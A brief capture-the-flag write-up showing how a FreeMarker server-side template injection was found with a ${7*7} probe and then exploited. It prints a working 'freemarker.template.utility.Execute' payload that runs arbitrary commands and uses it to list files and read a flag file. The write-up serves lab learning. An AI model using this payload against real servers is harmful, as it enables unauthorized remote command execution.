I did not really know how to get started, so I intercepted the request that I send when I click on check, and I see:

X-Powered-By:FREEMARKER.

Then we read the documentation of Freemarker. We enter

```
test ${7*7}
```
, and the return is test 49

So this is vulnerable to template injection. We can inject arbitrary commands thanks to

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cmd") }
```

Well, just ls, and cat ../SECRET_FLAG.txt.
